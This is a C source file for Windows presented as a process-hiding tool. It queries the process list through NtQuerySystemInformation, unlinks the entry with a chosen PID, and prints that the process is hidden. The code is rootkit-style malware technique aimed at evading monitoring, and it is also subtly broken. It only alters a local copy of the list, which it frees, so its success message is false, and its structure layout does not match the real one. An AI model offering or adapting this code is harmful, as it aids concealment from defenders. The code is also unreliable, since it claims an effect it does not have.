#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG Reserved1;
	ULONG Reserved2;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE ParentProcessId;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

NTSTATUS(NTAPI* NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

void HideProcess(DWORD pid) {
	NTSTATUS status;
	PSYSTEM_PROCESS_INFO spi = NULL;
	ULONG bufferSize = 0x10000;
	
	// Get NtQuerySystemInformation address
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	NtQuerySystemInformation = (void*)GetProcAddress(ntdll, "NtQuerySystemInformation");
	
	// Query process list
	spi = (PSYSTEM_PROCESS_INFO)malloc(bufferSize);
	while ((status = NtQuerySystemInformation(5, spi, bufferSize, NULL)) == 0xC0000004L) {
		free(spi);
		bufferSize *= 2;
		spi = (PSYSTEM_PROCESS_INFO)malloc(bufferSize);
	}

	// Walk process list
	PSYSTEM_PROCESS_INFO current = spi;
	while (current->NextEntryOffset) {
		PSYSTEM_PROCESS_INFO next = (PSYSTEM_PROCESS_INFO)((LPBYTE)current + current->NextEntryOffset);
		
		if ((DWORD)next->ProcessId == pid) {
			// Unlink process entry
			if (next->NextEntryOffset)
				current->NextEntryOffset += next->NextEntryOffset;
			else
				current->NextEntryOffset = 0;
			break;
		}
		current = next;
	}
	
	free(spi);
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}
	
	DWORD targetPid = atoi(argv[1]);
	HideProcess(targetPid);
	
	printf("Process %d hidden from system queries\n", targetPid);
	return 0;
}